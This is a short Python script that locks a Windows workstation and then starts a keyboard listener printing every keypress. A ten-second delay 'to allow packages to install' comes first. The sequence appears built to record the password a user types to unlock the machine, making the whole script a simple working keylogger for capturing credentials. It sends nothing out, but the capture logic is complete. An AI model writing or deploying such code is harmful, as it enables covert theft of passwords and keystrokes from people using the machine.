import ctypes
import time

from pynput import keyboard

# Set sleep time to allow packages to install
time.sleep(10)

# Locks machine and requires password
ctypes.windll.user32.LockWorkStation()

# Monitors keyboard inputs
def on_press(key):
    try:
        print(format(key.char))
    except AttributeError:
        print(format(key))

with keyboard.Listener(
    on_press = on_press) as listener:
    listener.join()












